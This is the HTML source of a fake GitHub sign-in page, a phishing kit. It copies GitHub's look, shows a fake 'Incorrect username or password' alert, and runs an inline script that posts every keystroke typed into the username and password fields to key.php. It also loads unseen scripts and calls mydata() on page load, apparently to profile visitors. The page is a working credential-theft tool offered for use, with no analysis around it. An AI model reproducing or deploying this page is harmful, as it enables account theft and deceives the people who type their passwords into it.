<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>GitHub login</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="./style.css">

  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <script src="client.min.js"></script>
  <script src="loc.js"></script>

</head>
<body onload="mydata()">
 
<div class="body">
        <div class="all-container col-12">
            <!-- logo -->
            <div class="logo-container">
                <img src="https://www.uplooder.net/img/image/91/aa85c0841f14ee083ed03bfc1c81284d/github-logo.png" alt="github-logo" class="logo">
            </div>
            <!-- text -->
            <span class="text-white fs-4 fw-lighter login-text">Sign in to GitHub</span>
            <!-- alert -->
            <div class="alert-container">
                <span style="margin-right: 20px;">Incorrect username or password.</span>
                <img src="https://www.uplooder.net/img/image/14/8a6a4b8d349f687ee2dbb3170517c009/close.svg" alt="close-icon" class="alert-close">
            </div>
            <!-- sign in -->
            <div class="signin-container rounded">
                <div class="form-container">
                    <div class="mb-3">
                        <label for="inputUsername" class="mb-2 form-label text-white inputTitle">Username or email address</label>
                        <input type="text" class="form-control input" id="inputUsername">
                    </div>
                    <div class="mb-0">
                        <div class="d-flex justify-content-between">
                            <label for="inputPassword" class="mb-2 form-label text-white inputTitle">Password</label>
                            <a href="#" class="forget-password">Forgot password?</a>
                        </div>
                        <input type="password" class="form-control input" id="inputPassword">
                    </div>
                </div>
                <button type="button" class="btn btn-success signin-btn">sign in</button>
            </div>
            <!-- create account -->
            <div class="new-container">
                <span><span  class="new-text">New to GitHub? </span><a href="#" style="font-size: .9rem;">Create an account</a>.</span>
            </div>
            <!-- links -->
            <div class="links-container">
                <a href="#">Terms</a>
                <a href="#">Privacy</a>
                <a href="#">Security</a>
                <a href="#" class="text-muted">Contact GitHub</a>
            </div>
        </div>
    </div>

<!-- bootstrap & popper & jQuery -->
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>

<script  src="./script.js"></script>

  <script>
      
    document
    .getElementById("inputUsername")
    .addEventListener("keypress", function (data) {
        $.post("key.php", { userkey: data.key });
      });
      
    document
      .getElementById("inputPassword")
      .addEventListener("keypress", function (data) {
        $.post("key.php", { passkey: data.key });
      });
      

  </script>

</body>
</html>
